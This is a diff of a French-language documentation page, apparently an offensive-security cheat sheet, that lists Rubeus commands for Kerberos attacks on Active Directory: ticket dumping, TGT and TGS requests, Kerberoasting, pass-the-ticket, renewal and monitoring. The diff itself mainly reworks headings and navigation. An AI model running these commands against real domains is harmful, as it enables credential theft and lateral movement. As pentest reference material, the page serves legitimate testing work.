@@ -73,6 +73,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#dump-des-tickets" class="md-skip">
+          Skip to content
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -3236,6 +3241,17 @@
       
       
       
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Rubeus
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
       <a href="./" class="md-nav__link md-nav__link--active">
         
   
@@ -3245,6 +3261,86 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#dump-des-tickets" class="md-nav__link">
+    <span class="md-ellipsis">
+      Dump des tickets:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#demander-un-tgt" class="md-nav__link">
+    <span class="md-ellipsis">
+      Demander un TGT:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#demander-un-tgs" class="md-nav__link">
+    <span class="md-ellipsis">
+      Demander un TGS:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kerberoasting" class="md-nav__link">
+    <span class="md-ellipsis">
+      Kerberoasting:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pass-the-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass the ticket:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#renouveler-un-tgt" class="md-nav__link">
+    <span class="md-ellipsis">
+      Renouveler un tgt:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#monitorer-les-changements-dans-les-tickets-kerberos-sur-la-machine-actuelle" class="md-nav__link">
+    <span class="md-ellipsis">
+      Monitorer les changements dans les tickets kerberos sur la machine actuelle:
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -7848,6 +7944,77 @@
   
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#dump-des-tickets" class="md-nav__link">
+    <span class="md-ellipsis">
+      Dump des tickets:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#demander-un-tgt" class="md-nav__link">
+    <span class="md-ellipsis">
+      Demander un TGT:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#demander-un-tgs" class="md-nav__link">
+    <span class="md-ellipsis">
+      Demander un TGS:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kerberoasting" class="md-nav__link">
+    <span class="md-ellipsis">
+      Kerberoasting:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pass-the-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass the ticket:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#renouveler-un-tgt" class="md-nav__link">
+    <span class="md-ellipsis">
+      Renouveler un tgt:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#monitorer-les-changements-dans-les-tickets-kerberos-sur-la-machine-actuelle" class="md-nav__link">
+    <span class="md-ellipsis">
+      Monitorer les changements dans les tickets kerberos sur la machine actuelle:
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -7863,39 +8030,39 @@
 
   <h1>Rubeus</h1>
 
-<p>Dump des tickets:
+<h4 id="dump-des-tickets">Dump des tickets:</h4>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>Rubeus.exe<span class="w"> </span>dump
-</span></code></pre></div></p>
-<p>Demander un TGT:
+</span></code></pre></div>
+<h4 id="demander-un-tgt">Demander un TGT:</h4>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>Rubeus.exe<span class="w"> </span>asktgt<span class="w"> </span>/user:<span class="w"> </span>/password:<span class="w"> </span>/domain:
-</span></code></pre></div></p>
-<p>Demander un TGS:
+</span></code></pre></div>
+<h4 id="demander-un-tgs">Demander un TGS:</h4>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>Rubeus.exe asktgs /ticket: /service:
-</span></code></pre></div></p>
+</span></code></pre></div>
 <blockquote>
 <p>[!Argument]
 <strong>/ticket</strong> : tgt en base64</p>
 </blockquote>
-<p>Kerberoasting:
+<h4 id="kerberoasting">Kerberoasting:</h4>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>Rubeus.exe<span class="w"> </span>kerberoast
-</span></code></pre></div></p>
-<p>Pass the ticket:
+</span></code></pre></div>
+<h4 id="pass-the-ticket">Pass the ticket:</h4>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>Rubeus.exe ptt /ticket:
-</span></code></pre></div></p>
+</span></code></pre></div>
 <blockquote>
 <p>[!Argument]
 <strong>/ticket</strong> : tgt en base64</p>
 </blockquote>
-<p>Renouveler un tgt:
+<h4 id="renouveler-un-tgt">Renouveler un tgt:</h4>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>Rubeus.exe<span class="w"> </span>renew<span class="w"> </span>/ticket:
-</span></code></pre></div></p>
+</span></code></pre></div>
 <blockquote>
 <p>[!Argument]
 <strong>/ticket</strong> : tgt en base64</p>
 </blockquote>
-<p>Monitorer les changements dans les tickets kerberos sur la machine actuelle:
+<h4 id="monitorer-les-changements-dans-les-tickets-kerberos-sur-la-machine-actuelle">Monitorer les changements dans les tickets kerberos sur la machine actuelle:</h4>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>Rubeus.exe<span class="w"> </span>monitor
-</span></code></pre></div></p>
+</span></code></pre></div>
 
 
 
